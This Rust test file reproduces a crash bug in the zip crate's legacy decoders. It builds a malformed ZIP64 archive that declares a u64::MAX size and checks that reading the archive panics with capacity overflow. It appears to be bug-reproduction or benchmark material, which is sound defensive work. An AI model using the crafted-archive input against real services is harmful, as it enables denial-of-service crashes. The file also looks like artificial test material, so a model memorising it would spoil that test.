//! zip-6 (crash-from-input): the legacy Shrink/Reduce/Implode decoders pass the
//! archive-declared uncompressed size straight to Vec::reserve
//! (src/legacy/shrink.rs:340, reduce.rs:107, implode.rs:214). An entry
//! declaring 0xFFFF_FFFF_FFFF_FFFF panics with capacity overflow from the
//! public read API. Needs the non-default `legacy-zip` feature.
//!
//! Exit 0 only if reading a Shrink entry with a u64::MAX declared size crashes
//! with a capacity-overflow panic.

use std::io::{Cursor, Read};
use std::panic;
use zip::ZipArchive;

/// One legacy entry of the given method, ZIP64 size fields = `declared`.
fn build(method: u16, declared: u64, payload: &[u8]) -> Vec<u8> {
    const SENTINEL: u32 = 0xFFFF_FFFF;
    let name = b"a";
    let mut o = Vec::new();
    o.extend_from_slice(&[0x50, 0x4b, 0x03, 0x04]);
    o.extend_from_slice(&45u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&method.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0x21u16.to_le_bytes());
    o.extend_from_slice(&0u32.to_le_bytes());
    o.extend_from_slice(&SENTINEL.to_le_bytes());
    o.extend_from_slice(&SENTINEL.to_le_bytes());
    o.extend_from_slice(&(name.len() as u16).to_le_bytes());
    o.extend_from_slice(&20u16.to_le_bytes());
    o.extend_from_slice(name);
    o.extend_from_slice(&0x0001u16.to_le_bytes());
    o.extend_from_slice(&16u16.to_le_bytes());
    o.extend_from_slice(&declared.to_le_bytes());
    o.extend_from_slice(&(payload.len() as u64).to_le_bytes());
    o.extend_from_slice(payload);

    let cd_offset = o.len() as u32;
    o.extend_from_slice(&[0x50, 0x4b, 0x01, 0x02]);
    o.extend_from_slice(&0x031Eu16.to_le_bytes());
    o.extend_from_slice(&45u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&method.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0x21u16.to_le_bytes());
    o.extend_from_slice(&0u32.to_le_bytes());
    o.extend_from_slice(&SENTINEL.to_le_bytes());
    o.extend_from_slice(&SENTINEL.to_le_bytes());
    o.extend_from_slice(&(name.len() as u16).to_le_bytes());
    o.extend_from_slice(&20u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&(0o644u32 << 16).to_le_bytes());
    o.extend_from_slice(&0u32.to_le_bytes());
    o.extend_from_slice(name);
    o.extend_from_slice(&0x0001u16.to_le_bytes());
    o.extend_from_slice(&16u16.to_le_bytes());
    o.extend_from_slice(&declared.to_le_bytes());
    o.extend_from_slice(&(payload.len() as u64).to_le_bytes());

    let cd_size = o.len() as u32 - cd_offset;
    o.extend_from_slice(&[0x50, 0x4b, 0x05, 0x06]);
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o.extend_from_slice(&1u16.to_le_bytes());
    o.extend_from_slice(&1u16.to_le_bytes());
    o.extend_from_slice(&cd_size.to_le_bytes());
    o.extend_from_slice(&cd_offset.to_le_bytes());
    o.extend_from_slice(&0u16.to_le_bytes());
    o
}

#[test]
fn shrink_declared_size_crashes_read() {
    // method 1 = Shrink
    let data = build(1, u64::MAX, b"\x00\x01\x02\x03");
    let mut ar = ZipArchive::new(Cursor::new(data)).expect("archive opens");

    panic::set_hook(Box::new(|_| {}));
    let result = panic::catch_unwind(panic::AssertUnwindSafe(|| {
        let mut f = ar.by_index(0).expect("by_index");
        let mut out = Vec::new();
        f.read_to_end(&mut out)
    }));
    let _ = panic::take_hook();

    let payload = match result {
        Ok(r) => panic!("BUG NOT PRESENT: read did not crash, returned {r:?}"),
        Err(e) => e,
    };
    let msg = payload
        .downcast_ref::<String>()
        .map(|s| s.as_str())
        .or_else(|| payload.downcast_ref::<&str>().copied())
        .unwrap_or("<non-string panic>");
    eprintln!("observed panic: {msg}");
    assert!(
        msg.contains("capacity overflow"),
        "expected capacity-overflow panic from the legacy decoder reserve, got: {msg}"
    );
    eprintln!("REPRODUCED: the Shrink decoder panicked with capacity overflow on a u64::MAX declared size");
}
